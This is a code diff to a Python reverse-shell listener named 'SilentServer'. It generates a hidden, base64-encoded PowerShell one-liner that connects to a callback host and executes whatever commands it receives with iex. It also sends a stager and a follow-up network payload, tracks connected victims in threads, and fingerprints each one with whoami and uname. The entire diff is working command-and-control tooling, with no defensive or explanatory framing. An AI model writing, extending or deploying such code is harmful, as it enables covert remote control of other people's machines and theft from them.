@@ -8,6 +8,11 @@ import core.Payloads
 import core.TextAssets
 
 @dataclasses.dataclass
+class DataPoll:
+        new_data      : bool
+        break_set     : bool
+
+@dataclasses.dataclass
 class ClientStructure:
         client        : object
         client_id     : str
@@ -22,28 +27,17 @@ class SilentServer:
                 self.callback_address   = callback_address
                 self.callback_port      = callback_port
                 self.listener           = None
-                self.manager            = None
                 self.server_thread      = None
-                self.server_shutdown    = threading.Event()
-
+                self.manager            = None
                 self.clients            = []
-                self.client_id          = None
-                self.client_os          = None
-                self.client_user        = None
-
-                self.client             = None
-
-                self.data_broker        = None
-                self.new_data           = False
-                self.break_set          = False
+                self.in_comm            = False
 
         def get_payload(self) -> str:
-                payload                 = ("start powershell -wi h -arg {$t=[net.sockets.tcpclient]::new('"
-                                           f"{self.callback_address}"
-                                           "',"
-                                           f"{str(self.callback_port)}"
-                                           ");[io.streamreader]::new($t.getstream()).readline()|iex}")
-
+                payload                 = "start powershell -wi h -arg {$t=[net.sockets.tcpclient]::new('"
+                payload                += self.callback_address
+                payload                += "',"
+                payload                +=  str(self.callback_port)
+                payload                += ");[io.streamreader]::new($t.getstream()).readline()|iex}"
                 payload                 = payload.encode("utf-16le")
                 payload                 = base64.b64encode(payload)
                 payload                 = payload.decode("ascii")
@@ -73,6 +67,22 @@ class SilentServer:
 
                 return True
 
+        def shutdown(self) -> None:
+                self.listener.close()
+                self.listener           = None
+                self.server_thread      = None
+
+                return True
+
+        # A solution to client connection management is using an independant thread to check current
+        # clients connection status.
+
+        # Every second, the thread will check the connection of the currently held clients.
+        # To mitigate redundancy, do not check clients' connects that are already lost.
+        # If a client is sending data recv(1, socket.MSG_PEEK) will check the first byte
+        # while not consuming it. If we have a blocking error, the connection is still
+        # present. If we get any other error, a disconnect.
+
         def client_manager(self) -> None:
                 while True:
                         time.sleep(1)
@@ -86,7 +96,7 @@ class SilentServer:
                         if  not self.peek_client(client.client):
                                 client.client_status = "Lost"
                                 self.clients[index] = client
-                                core.TextAssets.print_lost_client(client, True)
+                                self.print_lost_client(client)
 
         def peek_client(self, client) -> None:
                 try:
@@ -100,43 +110,36 @@ class SilentServer:
 
                 return data == b""
 
+        def print_lost_client(self, client: object) -> None:
+                if self.in_comm:
+                        core.TextAssets.print_lost_client(client, False)
+
+                if not self.in_comm:
+                        core.TextAssets.print_lost_client(client, True)
+
+        # Previously, we were able to accept as many clients possible, but we were not able to handle
+        # all of them simultaneously. Because we have a strict time format for handling an accepted
+        # client, this means we may be very slow to react to many connections (waiting up to the
+        # entire timeout duration of each connected client).
+
+        # Instead of letting our own timer bog the work, we instead run independent threads to handle
+        # a newly accepted client.
+
         def begin_listen(self) -> None:
                 while True:
                         try:
-                                self.client, address = self.accept_client()
+                                client, address = self.accept_client()
                         except:
                                 return None
 
-                        self.client.setblocking(False)
+                        client.setblocking(False)
 
-                        if not self.verify_client():
-                            self.client.close()
-                            continue
-
-                        client_struct   = ClientStructure(
-                                client        = self.client,
-                                client_id     = self.client_id,
-                                client_addr   = address[0],
-                                client_os     = self.client_os,
-                                client_user   = self.client_user,
-                                client_status = "Active",
-                                client_usage  = "No"
+                        client_check    = threading.Thread(
+                                target  = self.begin_accept,
+                                args    = (client,address),
+                                daemon  = True
                         )
-
-                        self.clients.append(client_struct)
-                        core.TextAssets.print_client(client_struct)
-
-                        self.client_id        = None
-                        self.client_os        = None
-                        self.client_user      = None
-
-        def shutdown(self) -> None:
-                self.listener.close()
-                self.listener           = None
-                self.server_shutdown.set()
-                self.server_thread      = None
-
-                return True
+                        client_check.start()
 
         def accept_client(self) -> bool:
                 try:
@@ -144,36 +147,89 @@ class SilentServer:
                 except:
                         return False
 
-        def verify_client(self) -> bool:
-                self.client_id          = self.get_client_id()
+        def begin_accept(self, client: object, address: str) -> None:
+                client_object           = self.verify_client(client)
 
-                if not self.wait_client():
-                        if not self.send_payload():
-                                return False
+                if not client_object:
+                        client.close()
+                        return
 
-                if not self.verify_username():
-                        return False
+                client_id, username, os = client_object
 
-                if not self.client_user:
-                        return False
+                client_struct   = ClientStructure(
+                        client        = client,
+                        client_id     = client_id,
+                        client_addr   = address[0],
+                        client_os     = os,
+                        client_user   = username,
+                        client_status = "Active",
+                        client_usage  = "No"
+                )
 
-                if self.client_os:
-                        return True
+                self.clients.append(client_struct)
+                core.TextAssets.print_client(client_struct)
 
-                if not self.verify_os():
-                        return False
+        def verify_client(self, client: object) -> tuple[str, str, str]:
+                client_id               = self.get_client_id()
 
-                if not self.client_os:
-                        return False
+                INITIAL_WAIT            = self.wait_client(client)
 
-                return True
+                if INITIAL_WAIT == None:
+                        return None
 
-        def verify_username(self) -> bool:
-                self.client.send("whoami\n".encode())
-                data                    = self.wait_client().decode()
+                if INITIAL_WAIT == b"":
+                        if not self.send_payload(client, client_id):
+                                return None
+
+                user_object             = self.verify_username(client)
+
+                if not user_object:
+                        return None
+
+                if len(user_object) == 1:
+                        username        = user_object[0]
+                else:
+                        return client_id, user_object[0], user_object[1]
+
+                os                      = self.verify_os(client)
+
+                if not os:
+                        return None
+
+                return client_id, username, os
+
+        def get_client_id(self) -> str:
+                client_id               = []
+
+                for _ in range(3):
+                        bits            = random.getrandbits(16)
+                        bits_string     = "{:04x}".format(bits)
+                        client_id.append(bits_string)
+
+                client_id               = "-".join(client_id).upper()
+
+                return client_id
+
+        def send_payload(self, client: object, client_id: str) -> bool:
+                client.send(f"$w=[io.streamwriter]::new($t.getstream());$w.write('{client_id}');$w.flush();[io.streamreader]::new($t.getstream()).readline()|iex\n".encode())
+                data                    = self.wait_client(client).decode()
 
                 if not data:
                         return False
+
+                if data != client_id:
+                        return False
+
+                client.send(core.Payloads.NETWORK_PAYLOAD.encode())
+
+                return self.wait_client(client)
+
+        def verify_username(self, client: object) -> tuple[str, str]:
+                client.send("whoami\n".encode())
+                data                    = self.wait_client(client).decode()
+
+                if not data:
+                        return None
 
                 if "\n" in data:
                         data            = data.split("\n")
@@ -190,22 +246,19 @@ class SilentServer:
                                 break
 
                 if "\\" in data:
-                        self.client_os  = "Windows"
                         user            = data.split("\\")[1]
+                        os              = "Windows"
 
+                        return user, os
                 else:
-                        user            = data
+                        return data, None
 
-                self.client_user        = user
-
-                return True
-
-        def verify_os(self) -> bool:
-                self.client.send("uname\n".encode())
-                data                    = self.wait_client().decode()
+        def verify_os(self, client: object) -> str:
+                client.send("uname\n".encode())
+                data                    = self.wait_client(client).decode()
 
                 if not data:
-                        return False
+                        return None
 
                 if "\n" in data:
                         data            = data.split("\n")
@@ -221,24 +274,7 @@ class SilentServer:
                                 data    = potential_data.strip("\r")
                                 break
 
-                self.client_os          = data
-
-                return True
-
-
-        def send_payload(self) -> bool:
-                self.client.send(f"$w=[io.streamwriter]::new($t.getstream());$w.write('{self.client_id}');$w.flush();[io.streamreader]::new($t.getstream()).readline()|iex\n".encode())
-                data                    = self.wait_client().decode()
-
-                if not data:
-                        return False
-
-                if data != self.client_id:
-                        return False
-
-                self.client.send(core.Payloads.NETWORK_PAYLOAD.encode())
-
-                return self.wait_client()
+                return data
 
         #def wait_client(self) -> bool:
         #        data                    = b""
@@ -269,51 +305,49 @@ class SilentServer:
         #    except BlockingIOError:
         #            return b""
 
-        def wait_client(self) -> bytes:
-                self.new_data           = True
+        # Previously, we were expecting the client to not send data in many chunks. As for reverse
+        # shells, this is a critical failure. Reverse shells will often send the first available 
+        # standard output of a process. This means the data will ALWAYS result in chunks.
+
+        # Instead of accepting the first data we receive, give a duration of time for the last sent
+        # data before accepting the final output.
+
+        def wait_client(self, client: object) -> bytes:
                 data                    = b""
 
-                self.data_broker        = threading.Thread(
-                        target          = self.data_brokerage,
+                data_poll               = DataPoll(
+                        new_data        = True,
+                        break_set       = False
+                )
+
+                data_poller             = threading.Thread(
+                        target          = self.data_poller,
+                        args            = (data_poll,),
                         daemon          = True
                 )
-                self.data_broker.start()
+                data_poller.start()
 
-                while not self.break_set:
+                while not data_poll.break_set:
                         try:
-                                data   += self.client.recv(1024)
-                                self.new_data = True
+                                data   += client.recv(1024)
+                                data_poll.new_data = True
                         except BlockingIOError:
                                 pass
-
-                self.data_broker        = None
-                self.new_data           = False
-                self.break_set          = False
+                        except ConnectionResetError:
+                                return b""
 
                 return data
 
-        def data_brokerage(self) -> None:
+        def data_poller(self, data_poll: object) -> None:
                 times_data_checked      = 0
 
                 while times_data_checked != 20:
-                        if self.new_data:
-                                self.new_data = False
+                        if data_poll.new_data:
                                 times_data_checked = 0
+                                data_poll.new_data = False
                                 continue
 
                         times_data_checked += 1
                         time.sleep(0.1)
 
-                self.break_set              = True
-
-        def get_client_id(self) -> str:
-                client_id               = []
-
-                for _ in range(3):
-                        bits            = random.getrandbits(16)
-                        bits_string     = "{:04x}".format(bits)
-                        client_id.append(bits_string)
-
-                client_id               = "-".join(client_id).upper()
-
-                return client_id
+                data_poll.break_set     = True
